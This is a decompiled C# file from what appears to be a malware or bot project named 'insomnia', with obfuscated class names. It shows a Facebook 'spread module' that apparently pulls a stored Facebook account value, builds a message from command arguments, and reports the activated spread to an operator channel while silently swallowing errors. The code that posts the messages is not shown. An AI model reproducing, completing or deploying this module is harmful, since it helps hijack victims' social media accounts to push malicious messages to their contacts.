namespace insomnia;

internal class Class24
{
	public static void Method1(string[] A_0)
	{
		try
		{
			string text = Class37.Method3("facebook.com");
			string[] array = text.Split(new char[1] { ':' });
			string text2 = array[0];
			_ = 1;
			if (!(text != ""))
			{
				return;
			}
			bool flag = false;
			string text3 = "";
			foreach (string text4 in A_0)
			{
				if (text4.StartsWith("\""))
				{
					flag = true;
				}
				if (text4.EndsWith("\""))
				{
					flag = false;
					text3 += text4;
				}
				if (flag)
				{
					text3 = text3 + text4 + " ";
				}
			}
			text3 = text3.Replace("\"", "");
			text3.TrimEnd(new char[1] { ' ' });
			if (text3 != "")
			{
				Class31.Method3("[FACEBOOK]: Spread module activated. ( " + text2 + " => \"" + text3 + "\" )", Class26.Field8);
			}
		}
		catch
		{
		}
	}
}
